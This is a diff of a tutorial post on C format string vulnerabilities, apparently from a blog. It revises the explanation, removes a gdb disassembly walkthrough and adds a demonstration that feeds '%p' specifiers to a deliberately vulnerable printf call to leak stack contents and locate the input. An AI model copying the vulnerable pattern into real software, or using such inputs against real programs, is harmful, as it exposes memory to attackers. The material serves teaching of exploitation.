@@ -93,11 +93,13 @@ Breakpoint 2, 0x080484e6 in main (argc=2, argv=0xffffdc24) at printf_c.c:11
 0xffffdb6c:     0xaa    0xaa    0xaa    0xaa
 ~~~
 
-As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next. What would happen if we didn't pass any arguments at all?
+As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next.
+
+`printf` takes a variable number of arguments thought. So how does it know what to look for on the stack? It parses the format string.
 
 ## Reading arbitrary addresses
 
-As we saw above, `printf` expects its arguments to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:
+As we saw above, `printf` expects all its arguments (determined by the format string) to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:
 
 ~~~ c
 #include <stdlib.h>
@@ -106,7 +108,6 @@ As we saw above, `printf` expects its arguments to be on the stack - and when th
 int
 main(int argc, char* argv[])
 {
-  unsigned int var = 0xAAAAAAAA;
   char buffer[512];
   strcpy(buffer, argv[1]);
 
@@ -127,43 +128,23 @@ vagrant@vagrant:~/scratch$ ./a.out hello%08x
 helloffb5ad8b
 ~~~
 
-When a format string is included, `printf` will look for the arguments on the stack. In the case above, it will grab the first thing available. This is clearer with `gdb`:
+So what just happened? `printf` parsed the format string and decided it needed an extra argument - and just took the next item on the stack and displayed it as a 4-bytes word. Let's try that again with a more contrived example:
 
 ~~~ shell
-vagrant@vagrant:~/scratch$ gdb -q ./a.out
-Reading symbols from ./a.out...done.
-(gdb) disass main
-Dump of assembler code for function main:
-   ...
-   0x080484b1 <+22>:    mov    DWORD PTR [ebp-0xc],0xaaaaaaaa
-   0x080484b8 <+29>:    mov    eax,DWORD PTR [eax+0x4]
-   0x080484bb <+32>:    add    eax,0x4
-   0x080484be <+35>:    mov    eax,DWORD PTR [eax]
-   0x080484c0 <+37>:    sub    esp,0x8
-   0x080484c3 <+40>:    push   eax
-   0x080484c4 <+41>:    lea    eax,[ebp-0x20c]
-   0x080484ca <+47>:    push   eax
-   0x080484cb <+48>:    call   0x8048350 <strcpy@plt>
-   0x080484d0 <+53>:    add    esp,0x10
-   0x080484d3 <+56>:    sub    esp,0xc
-   0x080484d6 <+59>:    lea    eax,[ebp-0x20c]
-   0x080484dc <+65>:    push   eax
-   0x080484dd <+66>:    call   0x8048340 <printf@plt>
-   ...
----Type <return> to continue, or q <return> to quit---q
-Quit
-(gdb) break *0x080484dd
-Breakpoint 1 at 0x80484dd: file printf_c.c, line 11.
-(gdb) x/4wx $esp
-0xffffd950:     0xffffd96c      0xffffdd74      0xf7ffcf1c      0xf7fefe7a
-(gdb) x/s 0xffffd96c
-0xffffd96c:     "hello%x"
-(gdb) x/4x 0xffffdd74
-0xffffdd74:     0x68    0x65    0x6c    0x6c
-(gdb) n
-12        printf("\n");
-(gdb) n
-helloffffdd74
+vagrant@vagrant:~/scratch$ ./a.out DDDD$(perl -e "print '%p..'x12")
+DDDD0xffdf3d60..0xf77d8f1c..0xf77cbe7a..0x8..0xf77cbe66..0xf77d9000..0x44444444..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..
 ~~~
 
+The `0x44444444` looks suspicious, and so does the repeating `0x2e2e7025`. Sure enough:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ printf "\x44\x44\x44\x44\n"
+DDDD
+vagrant@vagrant:~/scratch$ printf "\x2e\x2e\x70\x25\n"
+..p%
+~~~
+
+Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time it has been placed fully on the stack! And as we walk down the stack we encounter what we put on.
+
+This unfortunately means we cannot read past our input - but we can trick `printf` into reading a string at a memory location of our choosing.
 
